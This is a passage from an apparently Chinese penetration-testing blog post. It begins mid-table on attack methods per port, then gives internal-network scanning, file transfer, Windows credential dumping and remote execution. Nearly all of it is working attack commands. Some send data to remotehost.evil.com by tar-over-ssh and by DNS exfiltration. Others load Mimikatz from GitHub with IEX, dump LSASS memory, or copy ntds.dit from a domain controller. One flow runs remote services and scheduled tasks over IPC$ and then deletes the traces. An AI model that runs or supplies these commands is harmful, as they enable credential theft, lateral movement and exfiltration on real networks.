<tr>
<td>389</td>
<td>ldap</td>
<td>注入攻击\未授权访问</td>
</tr>
<tr>
<td>512/513/514</td>
<td>linux r</td>
<td>直接使用rlogin</td>
</tr>
<tr>
<td>873</td>
<td>rsync</td>
<td>未授权访问</td>
</tr>
<tr>
<td>1080</td>
<td>socket</td>
<td>爆破：进行内网渗透</td>
</tr>
<tr>
<td>1352</td>
<td>lotus</td>
<td>爆破：弱口令\信息泄漏：源代码</td>
</tr>
<tr>
<td>1433</td>
<td>mssql</td>
<td>爆破：使用系统用户登录\注入攻击</td>
</tr>
<tr>
<td>1521</td>
<td>oracle</td>
<td>爆破：TNS\注入攻击</td>
</tr>
<tr>
<td>2049</td>
<td>nfs</td>
<td>配置不当</td>
</tr>
<tr>
<td>2181</td>
<td>zookeeper</td>
<td>未授权访问</td>
</tr>
<tr>
<td>3306</td>
<td>mysql</td>
<td>爆破\拒绝服务\注入</td>
</tr>
<tr>
<td>3389</td>
<td>rdp</td>
<td>爆破\Shift后门</td>
</tr>
<tr>
<td>4848</td>
<td>glassfish</td>
<td>爆破：控制台弱口令\认证绕过</td>
</tr>
<tr>
<td>5000</td>
<td>sybase/DB2</td>
<td>爆破\注入</td>
</tr>
<tr>
<td>5432</td>
<td>postgresql</td>
<td>缓冲区溢出\注入攻击\爆破：弱口令</td>
</tr>
<tr>
<td>5632</td>
<td>pcanywhere</td>
<td>拒绝服务\代码执行</td>
</tr>
<tr>
<td>5900</td>
<td>vnc</td>
<td>爆破：弱口令\认证绕过</td>
</tr>
<tr>
<td>6379</td>
<td>redis</td>
<td>未授权访问\爆破：弱口令</td>
</tr>
<tr>
<td>7001</td>
<td>weblogic</td>
<td>Java反序列化\控制台弱口令\控制台部署webshell</td>
</tr>
<tr>
<td>80/443/8080</td>
<td>web</td>
<td>常见web攻击\控制台爆破\对应服务器版本漏洞</td>
</tr>
<tr>
<td>8069</td>
<td>zabbix</td>
<td>远程命令执行</td>
</tr>
<tr>
<td>9090</td>
<td>websphere控制台</td>
<td>爆破：控制台弱口令\Java反序列</td>
</tr>
<tr>
<td>9200/9300</td>
<td>elasticsearch</td>
<td>远程代码执行</td>
</tr>
<tr>
<td>11211</td>
<td>memcacache</td>
<td>未授权访问</td>
</tr>
<tr>
<td>27017</td>
<td>mongodb</td>
<td>爆破\未授权访问</td>
</tr>
</tbody></table>
<p>引用：<a href="https://www.91ri.org/15441.html" target="_blank" rel="noopener">https://www.91ri.org/15441.html</a><br>wooyun也有讨论：<a href="http://zone.wooyun.org/content/18959" target="_blank" rel="noopener">http://zone.wooyun.org/content/18959</a><br>对于端口也就是一个服务的利用，上文也只是大概的讲述，一些常见的详细利用与防御可以看看：<br><a href="http://wiki.wooyun.org/enterprise:server" target="_blank" rel="noopener">http://wiki.wooyun.org/enterprise:server</a></p>
<p>####扫描分析</p>
<p>1、nbtscan<br>获取mac地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nbtstat -A 192.168.1.99</span><br></pre></td></tr></table></figure>

<p>获取计算机名\分析dc\是否开放共享  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nbtscan 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/4/1.jpg" alt><br>其中信息：<br>SHARING  表示开放来共享，<br>DC  表示可能是域控，或者是辅助域控<br>U=user  猜测此计算机登陆名<br>IIS  表示运行来web80<br>EXCHANGE  Microsoft Exchange服务<br>NOTES   Lotus Notes服务  </p>
<p>2、WinScanX<br>需要登录账号能够获取目标很详细的内容。其中还有snmp获取,windows密码猜解(但是容易被杀,nishang中也实现出一个类似的信息获取/Gather/Get-Information.ps1)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WinScanX.exe -3 DC1 centoso\pentest password -a &gt; test.txt</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/4/2.jpg" alt></p>
<p>3、端口扫描<br>InsightScan<br>proxy_socket后，直接  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains python scanner.py 192.168.0.0/24 -N</span><br></pre></td></tr></table></figure>

<p><a href="http://insight-labs.org/?p=981" target="_blank" rel="noopener">http://insight-labs.org/?p=981</a></p>
<p>###内网文件传输<br>####windows下文件传输<br>1、powershell文件下载<br>powershell突破限制执行：powershell -ExecutionPolicy Bypass -File .\1.ps1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$d = New-Object System.Net.WebClient</span><br><span class="line">$d.DownloadFile(&quot;http://lemon.com/file.zip&quot;,&quot;c:/1.zip&quot;)</span><br></pre></td></tr></table></figure>

<p>2、vbs脚本文件下载</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Set xPost=createObject(<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">xPost.Open <span class="string">"GET"</span>,<span class="string">"http://192.168.206.101/file.zip"</span>,<span class="number">0</span></span><br><span class="line">xPost.Send()</span><br><span class="line">set sGet=createObject(<span class="string">"ADODB.Stream"</span>)</span><br><span class="line">sGet.Mode=<span class="number">3</span></span><br><span class="line">sGet.Type=<span class="number">1</span></span><br><span class="line">sGet.Open()</span><br><span class="line">sGet.Write xPost.ResponseBody</span><br><span class="line">sGet.SaveToFile <span class="string">"c:\file.zip"</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>下载执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure>

<p>3、bitsadmin<br>win03测试没有,win08有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer n http://lemon.com/file.zip c:\1.zip</span><br></pre></td></tr></table></figure>

<p>4、文件共享<br>映射了一个，结果没有权限写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use x: \\127.0.0.1\share /user:centoso.com\userID myPassword</span><br></pre></td></tr></table></figure>

<p>5、使用telnet接收数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务端：nc -lvp 23 &lt; nc.exe</span><br><span class="line">下载端：telnet ip -f c:\nc.exe</span><br></pre></td></tr></table></figure>

<p>6、hta<br>保存为.hta文件后运行</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> <span class="built_in">Object</span> = <span class="keyword">new</span> ActiveXObject(<span class="string">"MSXML2.XMLHTTP"</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.open(<span class="string">"GET"</span>,<span class="string">"http://192.168.206.101/demo.php.zip"</span>,<span class="literal">false</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.send();</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (<span class="built_in">Object</span>.Status == <span class="number">200</span>)</span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> Stream = <span class="keyword">new</span> ActiveXObject(<span class="string">"ADODB.Stream"</span>);</span></span><br><span class="line"><span class="undefined">    Stream.Open();</span></span><br><span class="line"><span class="undefined">    Stream.Type = 1;</span></span><br><span class="line"><span class="javascript">    Stream.Write(<span class="built_in">Object</span>.ResponseBody);</span></span><br><span class="line"><span class="actionscript">    Stream.SaveToFile(<span class="string">"C:\\demo.zip"</span>, <span class="number">2</span>);</span></span><br><span class="line"><span class="undefined">    Stream.Close();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.close();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTA:APPLICATION</span> <span class="attr">ID</span>=<span class="string">"test"</span></span></span><br><span class="line"><span class="tag"><span class="attr">WINDOWSTATE</span> = <span class="string">"minimize"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>####linux下文件传输<br>1、perl脚本文件下载<br>kali下测试成功，centos5.5下，由于没有LWP::Simple这个，导致下载失败  </p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> LWP::Simple</span><br><span class="line">getstore(<span class="string">"http://lemon.com/file.zip"</span>, <span class="string">"/root/1.zip"</span>);</span><br></pre></td></tr></table></figure>

<p>2、python文件下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import urllib2</span><br><span class="line">u = urllib2.urlopen(&apos;http://lemon.com/file.zip&apos;)</span><br><span class="line">localFile = open(&apos;/root/1.zip&apos;, &apos;w&apos;)</span><br><span class="line">localFile.write(u.read())</span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>

<p>3、ruby文件下载<br>centos5.5没有ruby环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/ruby</span><br><span class="line">require &apos;net/http&apos;</span><br><span class="line">Net::HTTP.start(&quot;www.lemon.com&quot;) &#123; |http|</span><br><span class="line">r = http.get(&quot;/file.zip&quot;)</span><br><span class="line">open(&quot;/root/1.zip&quot;, &quot;wb&quot;) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4、wget文件下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://lemon.com/file.zip -P /root/1.zip</span><br><span class="line">其中-P是保存到指定目录</span><br></pre></td></tr></table></figure>

<p>5、一边tar一边ssh上传</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar zcf - /some/localfolder | ssh remotehost.evil.com &quot;cd /some/path/name;tar zxpf -&quot;</span><br></pre></td></tr></table></figure>

<p>6、利用dns传输数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar zcf - localfolder | xxd -p -c 16 |  while read line; do host $line.domain.com remotehost.evil.com; done</span><br></pre></td></tr></table></figure>

<p>但是有时候会因为没找到而导致数据重复,对数据分析有点影响<br><img src="/sourcepictures/2017/11/06/4/6.jpg" alt></p>
<p>####其他传输方式<br>1、php脚本文件下载  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $data = @file(&quot;http://example.com/file&quot;);</span><br><span class="line">        $lf = &quot;local_file&quot;;</span><br><span class="line">        $fh = fopen($lf, &apos;w&apos;);</span><br><span class="line">        fwrite($fh, $data[0]);</span><br><span class="line">        fclose($fh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2、ftp文件下载  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;**windows下**</span><br><span class="line">&gt;ftp下载是需要交互，但是也可以这样去执行下载</span><br><span class="line">open host</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">bin</span><br><span class="line">lcd c:/</span><br><span class="line">get file</span><br><span class="line">bye</span><br><span class="line">&gt;将这个内容保存为1.txt， ftp -s:&quot;c:\1.txt&quot;</span><br><span class="line">&gt;在mssql命令执行里面(不知道为什么单行执行一个echo,总是显示两行),个人一般喜欢这样</span><br><span class="line">echo open host &gt;&gt; c:\hh.txt &amp; echo username &gt;&gt; c:\hh.txt &amp; echo password &gt;&gt;c:\hh.txt &amp; echo bin &gt;&gt;c:\hh.txt &amp; echo lcd c:\&gt;&gt;c:\hh.txt &amp; echo get nc.exe  &gt;&gt;c:\hh.txt &amp; echo bye &gt;&gt;c:\hh.txt &amp; ftp -s:&quot;c:\hh.txt&quot; &amp; del c:\hh.txt</span><br><span class="line"></span><br><span class="line">&gt;**linux下**</span><br><span class="line"></span><br><span class="line">&gt;bash文件</span><br><span class="line">ftp 127.0.0.1</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">get file</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">&gt;或者使用busybox里面的tftp或者ftp</span><br><span class="line">&gt;busybox ftpget -u test -P test 127.0.0.1 file.zip</span><br></pre></td></tr></table></figure>

<p>3、nc文件传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务端:cat file | nc -l 1234</span><br><span class="line">下载端:nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>

<p>4、使用SMB传送文件<br>本地linux的smb环境配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;vi /etc/samba/smb.conf</span><br><span class="line">[test]</span><br><span class="line">    comment = File Server Share</span><br><span class="line">    path = /tmp/</span><br><span class="line">    browseable = yes</span><br><span class="line">    writable = yes</span><br><span class="line">    guest ok = yes</span><br><span class="line">    read only = no</span><br><span class="line">    create mask = 0755</span><br><span class="line">&gt;service samba start</span><br></pre></td></tr></table></figure>

<p>下载端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use o: \\192.168.206.129\test</span><br><span class="line">dir o:</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/4/5.jpg" alt></p>
<p>####文件编译<br>1、powershell将exe转为txt，再txt转为exe<br>nishang中的小脚本，测试一下将nc.exe转化为nc.txt再转化为nc1.exe<br>ExetoText.ps1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[byte[]] $hexdump = get-content -encoding byte -path &quot;nc.exe&quot;</span><br><span class="line">[System.IO.File]::WriteAllLines(&quot;nc.txt&quot;, ([string]$hexdump))</span><br></pre></td></tr></table></figure>

<p>TexttoExe.ps1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[String]$hexdump = get-content -path &quot;nc.txt&quot;</span><br><span class="line">[Byte[]] $temp = $hexdump -split &apos; &apos;</span><br><span class="line">[System.IO.File]::WriteAllBytes(&quot;nc1.exe&quot;, $temp)</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/4/3.jpg" alt></p>
<p>2、csc.exe编译源码<br>csc.exe在<code>C:\Windows\Microsoft.NET\Framework\</code>的各种版本之下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csc.exe /out:C:\evil\evil.exe C:\evil\evil.cs</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/4/4.jpg" alt></p>
<p>3、debug程序<br>hex功能能将hex文件转换为exe文件(win08_x64没有这个,win03_x32有,听说是x32才有这个)</p>
<p><img src="/sourcepictures/2017/11/06/4/7.png" alt></p>
<p>思路：  </p>
<ol>
<li>把需要上传的exe转换成十六进制hex的形式  </li>
<li>通过echo命令将hex代码写入文件(echo也是有长度限制的)  </li>
<li>使用debug功能将hex代码还原出exe文件  </li>
</ol>
<p><img src="/sourcepictures/2017/11/06/4/8.jpg" alt><br>将ncc.txt的内容一条一条的在cmd下面执行，最后可以获取到123.hex、1.dll、nc.exe<br>exe2bat不支持大于64kb的文件  </p>
<hr>
<p>###hash抓取<br>####hash简介<br>windows hash:  </p>
<p>|        | 2000  | xp| 2003 | Vista | win7 | 2008 | 2012 |<br>|——–|<br>|   LM   | √ | √ | √ |<br>|  NTLM  | √ | √ | √ | √ | √ | √ | √|</p>
<p>前面三个,当密码超过14位时候会采用NTLM加密<br>test:1003:E52CAC67419A9A22664345140A852F61:67A54E1C9058FCA16498061B96863248:::<br>前一部分是LM Hash，后一部分是NTLM Hash<br>当LM Hash是<strong>AAD3B435B51404EEAAD3B435B51404EE</strong><br>这表示<strong>空密码或者是未使用LM_HASH</strong>  </p>
<p>Hash一般存储在两个地方：<br>SAM文件，存储在本机                         对应本地用户<br>NTDS.DIT文件，存储在域控上              对应域用户  </p>
<p>####本机hash+明文抓取<br>1、Get-PassHashes.ps1<br><img src="/sourcepictures/2017/11/06/5/3.jpg" alt></p>
<p>2、导注册表+本地分析<br>Win2000和XP需要先提到SYSTEM，03开始直接可以reg save<br>导出的文件大,效率低,但是安全(测试的时候和QuarkPwDump抓取的hash不一致)  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line">reg save hklm\security security.hive</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/5/4.jpg" alt></p>
<p>3、QuarkPwDump  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QuarkPwDump.exe -dhl -o &quot;c:\1.txt&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/5/5.jpg" alt></p>
<p>4、getpass本地账户明文抓取<br>闪电小子根据mimikatz写的一个内存获取明文密码</p>
<p><img src="/sourcepictures/2017/11/06/5/6.jpg" alt></p>
<p><a href="http://bbs.pediy.com/showthread.php?t=156643" target="_blank" rel="noopener">http://bbs.pediy.com/showthread.php?t=156643</a></p>
<p>####win8+win2012明文抓取<br>修改一个注册表就可以抓取了  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1</span><br></pre></td></tr></table></figure>

<p>测试失败<br>工具：<a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1</a><br>文章地址：<a href="https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/" target="_blank" rel="noopener">https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/</a>  </p>
<hr>
<h4 id="域用户hash抓取"><a href="#域用户hash抓取" class="headerlink" title="域用户hash抓取"></a>域用户hash抓取</h4><p>#####(一)mimikatz<br>只能抓取登陆过的用户hash，无法抓取所有用户,需要免杀<br>1、本机测试直接获取内存中的明文密码  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/5/1.jpg" alt></p>
<p>2、非交互式抓明文密码(webshell中)  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &gt; pssword.txt</span><br></pre></td></tr></table></figure>

<p>3、powershell加载mimikatz抓取密码  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz</span><br></pre></td></tr></table></figure>

<p>4、ProcDump + Mimikatz本地分析<br>文件会比较大，低效，但是安全(绕过杀软)<br>ps:mimikatz的平台（platform）要与进行dump的系统(source dump)兼容(比如dowm了08的,本地就要用08系统来分析)  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">远程：</span><br><span class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">本地：</span><br><span class="line">sekurlsa::minidump lsass.dump.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/5/2.jpg" alt></p>
<p>#####（二）ntds.dit的导出+QuarkPwDump读取分析<br>无法抓取所有用户,需要免杀  </p>
<p>这个方法分为两步：<br>第一步是利用工具导出ntds.dit<br>第二步是利用QuarkPwDump去分析hash  </p>
<p>1、ntds.dit的导出  </p>
<ol>
<li>ntdsutil    win2008开始DC中自带的工具<br>a.交互式  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snapshot</span><br><span class="line">activate instance ntds</span><br><span class="line">create</span><br><span class="line">mount xxx</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p><img src="/sourcepictures/2017/11/06/5/7.jpg" alt></p>
<p>做完后unmount然后需要再delet一下</p>
<p><img src="/sourcepictures/2017/11/06/5/8.jpg" alt></p>
<p>b.非交互</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</span><br><span class="line">copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/5/9.jpg" alt></p>
<ol start="2">
<li>vshadow   微软的卷影拷贝工具  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vshadow.exe -exec=%ComSpec% C:</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>其中%ComSpec%是cmd的绝对路径,它在建立卷影后会启动一个程序,只有这个程序才能卷影进行操作,其他不能,比如这里就是用cmd.exe来的<br>最后exit一下</p>
<p><img src="/sourcepictures/2017/11/06/5/10.jpg" alt></p>
<p>2、QuarkPwDump分析<br><a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">https://github.com/quarkslab/quarkspwdump</a>  </p>
<ol>
<li><p>在线提取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit</span><br></pre></td></tr></table></figure>
</li>
<li><p>离线提取<br>需要两个文件 ntds.dit 和 system.hiv<br>其中system.hiv可通过<code>reg save hklm\system system.hiv</code>获取  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hiv</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p><img src="/sourcepictures/2017/11/06/5/11.jpg" alt></p>
<p>3、实战中hash导出流程  </p>
<ol>
<li><p>建立ipc$连接<br><code>net use \\DC1\c$ password /user:username</code>  </p>
</li>
<li><p>复制文件到DC<br><code>copy .\* \\DC1\windows\tasks</code>  </p>
</li>
<li><p>sc建立远程服务启动程序<br><code>sc \\DC1 create backupntds binPath= &quot;cmd /c start c:\windows\tasks\shadowcopy.bat&quot; type= share start= auto error= ignore DisplayName= BackupNTDS</code>  </p>
</li>
<li><p>启动服务<br><code>sc \\DC1 start backupntds</code>  </p>
</li>
<li><p>删除服务<br><code>sc \\DC1 delete backupntds</code>  </p>
</li>
<li><p>讲hash转移到本地<br><code>move \\DC1\c$\windows\tasks\hash.txt .</code>  </p>
</li>
<li><p>删除记录文件<br><code>del \\DC1\c$\windows\tasks\ntds.dit \\DC1\c$\windows\tasks\QuarksPwDump.exe \\DC1\c$\windows\tasks\shadowcopy.bat \\DC1\c$\windows\tasks\vshadow.exe</code>  </p>
</li>
</ol>
<p><img src="/sourcepictures/2017/11/06/5/12.jpg" alt></p>
<p>注意的两点是：<br>a.WORK_PATH和你拷贝的地方要相同<br><img src="/sourcepictures/2017/11/06/5/13.jpg" alt>  </p>
<p>b.附件中的QuarkPwDump在win08上面运行报错,另外修改版可以,所以实战前还是要测试一下  </p>
<p>#####（三）vssown.vbs + libesedb + NtdsXtract<br>上面的QuarkPwDump是在win上面分析ntds.dit,这个是linux上面的离线分析<br>优点是能获取全部的用户,不用免杀,但是数据特别大,效率低,另外用vssown.vbs复制出来的ntds.dit数据库无法使用QuarksPwDump.exe读取</p>
<p>hash导出：<br><a href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs" target="_blank" rel="noopener">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p>
<p>最后需要copy出system和ntds.dit两个文件  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\windows\system32\config\system</span><br><span class="line">c:\windows\ntds\ntds.dit</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/5/14.jpg" alt><br><img src="/sourcepictures/2017/11/06/5/15.jpg" alt><br>记得一定要delete快照！！！  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript vssown.vbs /delete *</span><br></pre></td></tr></table></figure>

<p>本地环境搭建+分析：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libesedb的搭建:</span><br><span class="line">wget https://github.com/libyal/libesedb/releases/download/20151213/libesedb-experimental-20151213.tar.gz</span><br><span class="line">tar zxvf libesedb-experimental-20151213.tar.gz</span><br><span class="line">cd libesedb-20151213/</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">cd esedbtools/</span><br><span class="line">(需要把刚刚vbs脱下来的ntds.dit放到kali)</span><br><span class="line">./esedbexport ./ntds.dit</span><br><span class="line">mv ntds.dit.export/ ../../</span><br><span class="line"></span><br><span class="line">ntdsxtract工具的安装:</span><br><span class="line">wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip</span><br><span class="line">unzip ntdsxtract_v1_0.zip</span><br><span class="line">cd NTDSXtract 1.0/</span><br><span class="line">(需要把刚刚vbs脱下来的SYSTEM放到/root/SYSTEM)</span><br><span class="line">python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes &apos;/root/SYSTEM&apos;</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/5/16.jpg" alt></p>
<p>#####ntdsdump<br>laterain的推荐：<a href="http://z-cg.com/post/ntds_dit_pwd_dumper.html" target="_blank" rel="noopener">http://z-cg.com/post/ntds_dit_pwd_dumper.html</a><br>是zcgonvh大牛根据quarkspwdump修改的，=。=，没找到和QuarkPwDump那个修改版的区别<br>获取ntds.dit和system.hiv之后(不用利用那个vbs导出,好像并不能分析出来)<br><img src="/sourcepictures/2017/11/06/5/17.jpg" alt></p>
<p>#####利用powershell(DSInternals)分析hash<br>查看powershell版本：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$PSVersionTable.PSVersion</span><br><span class="line">看第一个Major</span><br><span class="line">或者</span><br><span class="line">Get-Host | Select-Object Version</span><br></pre></td></tr></table></figure>

<p>Windows Server 2008 R2默认环境下PowerShell版本2.0，应该升级到3.0版本以上,需要.NET Framework 4.0</p>
<p>需要文件：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntds.dit(vshadow获取)</span><br><span class="line">system(reg获取)</span><br></pre></td></tr></table></figure>

<p>执行命令：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">允许执行脚本：</span><br><span class="line">Set-ExecutionPolicy Unrestricted</span><br><span class="line"></span><br><span class="line">导入模块(测试是win2012_powershell ver4.0)：</span><br><span class="line">Import-Module .\DSInternals</span><br><span class="line">(powershell ver5.0)</span><br><span class="line">Install-Module DSInternals</span><br><span class="line"></span><br><span class="line">分析hash,并导出到当前目录的hash.txt文件中</span><br><span class="line">1、$key = Get-BootKey -SystemHivePath &apos;C:\Users\administrator\Desktop\SYSTEM&apos;</span><br><span class="line">2、Get-ADDBAccount -All -DBPath &apos;C:\Users\administrator\Desktop\ntds.dit&apos; -BootKey $key | Out-File hash.txt</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/5/18.jpg" alt></p>
<p>这个只是离线分析了ntds.dit文件,其实也可以在线操作,=。=,不过感觉实战中遇到的会比较少,毕竟现在主流是win08为域控(以后这个倒不失为一个好方法)<br>更多详情参考三好学生大牛的文章：<a href="http://drops.wooyun.org/tips/10181" target="_blank" rel="noopener">http://drops.wooyun.org/tips/10181</a></p>
<hr>
<h3 id="远程连接-amp-amp-执行程序"><a href="#远程连接-amp-amp-执行程序" class="headerlink" title="远程连接&amp;&amp;执行程序"></a>远程连接&amp;&amp;执行程序</h3><p>####at&amp;schtasks<br>需要开启Task Scheduler服务<br>经典流程：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、进行一个连接</span><br><span class="line">net use \\10.10.24.44\ipc$ 密码 /user:账号</span><br><span class="line"></span><br><span class="line">2、复制本地文件到10.10.24.44的share共享目录(一般是放入admin$这个共享地方(也就是c:\winnt\system32\)，或者c$，d$)</span><br><span class="line">copy 4.bat \\10.10.24.44\share</span><br><span class="line"></span><br><span class="line">3、查看10.10.24.44服务器的时间</span><br><span class="line">net time \\10.10.24.44</span><br><span class="line"></span><br><span class="line">4、添加at任务执行</span><br><span class="line">at \\10.10.24.44 6:21 \\10.10.24.44\share\4.bat</span><br><span class="line">这个6:21指的是上午的时间，如果想添加下午的，则是6.21PM</span><br><span class="line"></span><br><span class="line">5、查看添加的所有at任务列表(如果执行了得，就不会显示)</span><br><span class="line">at \\10.10.24.44</span><br></pre></td></tr></table></figure>

<p>其他命令：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看所有连接</span><br><span class="line">net use</span><br><span class="line">删除连接</span><br><span class="line">net use \\10.10.24.44\share /del</span><br><span class="line"></span><br><span class="line">映射共享磁盘到本地</span><br><span class="line">net use z: \\IP\c$ &quot;密码&quot; /user:&quot;用户名&quot;</span><br><span class="line">删除共享映射</span><br><span class="line">net use c: /del</span><br><span class="line">net use * /del</span><br></pre></td></tr></table></figure>

